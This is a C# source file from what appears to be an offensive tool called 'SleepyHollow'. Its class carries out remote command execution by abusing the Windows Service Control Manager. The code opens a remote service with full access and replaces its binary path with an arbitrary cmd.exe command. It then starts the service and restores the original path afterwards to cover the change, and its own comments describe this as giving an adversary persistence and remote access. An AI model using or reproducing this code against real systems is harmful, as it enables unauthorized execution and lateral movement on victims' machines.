using System.Runtime.InteropServices;

namespace SleepyHollow;

/// <summary>
/// This class is used to run a command on a remote machine by abusing the service control manager.<br/>
/// Technique is called "Service Execution" and is a method of executing arbitrary commands on a remote system by changing the configuration of a Windows service and starting it.<br/>
/// Running a command from a service allows an adversary to gain persistence and remote access to a victim machine.<br/>
///
/// </summary>
internal static class RemoteExecution
{
    public static async Task Run(
        string hostname,
        string cmd,
        string serviceName = "SensorService",
        bool rawCmd = false
    )
    {
        if (!rawCmd)
            cmd = $"c:\\windows\\system32\\cmd.exe /c {cmd}";
        var serviceHandle = ConnectToService(hostname, serviceName);
        if (RuntimeConfig.IsDebugEnabled)
            Console.WriteLine($"Service handle: 0x{serviceHandle:X}");
        var oldBinary = GetPreviousBinaryPath(serviceHandle);
        var result = UpdateServiceConfiguration(serviceHandle, cmd);
        if (!result)
        {
            Console.WriteLine(
                "Failed to change service config. Error: {0}",
                Lib.GetLastWin32Error()
            );
            return;
        }
        _ = Lib.StartService(serviceHandle, 0, null);

        await Task.Delay(5000);
        result = UpdateServiceConfiguration(serviceHandle, oldBinary);
        if (!result)
        {
            Console.WriteLine(
                "Failed to restore old service config. Error: {0}",
                Lib.GetLastWin32Error()
            );
            return;
        }

        if (RuntimeConfig.IsDebugEnabled)
            Console.WriteLine("Command executed successfully - restored old service config.");
        return;
    }

    private static IntPtr ConnectToService(string hostname, string serviceName)
    {
        IntPtr SCMHandle = Lib.OpenSCManager(
            hostname,
            null,
            (uint)SCM_ACCESS.SC_MANAGER_ALL_ACCESS
        );
        if (SCMHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open SCManager");
            return IntPtr.Zero;
        }
        if (RuntimeConfig.IsDebugEnabled)
            Console.WriteLine($"SCManager handle: 0x{SCMHandle:X}");
        var serviceHandle = Lib.OpenService(
            SCMHandle,
            serviceName,
            (uint)SERVICE_ACCESS.SERVICE_ALL_ACCESS
        );
        if (serviceHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open service");
            return serviceHandle;
        }
        return serviceHandle;
    }

    private static bool UpdateServiceConfiguration(
        IntPtr hService,
        string binaryPath
    )
    {
        var result = Lib.ChangeServiceConfigA(
            hService,
            0xffffffff,
            0x3,
            0,
            binaryPath,
            null,
            null,
            null,
            null,
            null,
            null
        );
        if (result && RuntimeConfig.IsDebugEnabled)
            Console.WriteLine("Service config changed successfully.");
        return true;
    }

    private static string GetPreviousBinaryPath(IntPtr hService)
    {
        int bytesNeeded = 1;
        QueryServiceConfigStruct qscs = new QueryServiceConfigStruct();
        IntPtr qscPtr = Marshal.AllocCoTaskMem(0);
        int retCode = Lib.QueryServiceConfig(hService, qscPtr, 0, ref bytesNeeded);
        if (retCode == 0 && bytesNeeded == 0)
        {
            Console.WriteLine(
                "QueryServiceConfig failed to read the service path. Error: {0}",
                Lib.GetLastWin32Error()
            );
            return null;
        }
        qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
        retCode = Lib.QueryServiceConfig(hService, qscPtr, bytesNeeded, ref bytesNeeded);
        qscs.binaryPathName = IntPtr.Zero;
        qscs = Marshal.PtrToStructure<QueryServiceConfigStruct>(qscPtr);
        var oldBinaryPath = Marshal.PtrToStringAuto(qscs.binaryPathName);
        if (RuntimeConfig.IsDebugEnabled)
            Console.WriteLine($"Old binary path: {oldBinaryPath}");
        Marshal.FreeCoTaskMem(qscPtr);
        return oldBinaryPath;
    }
}
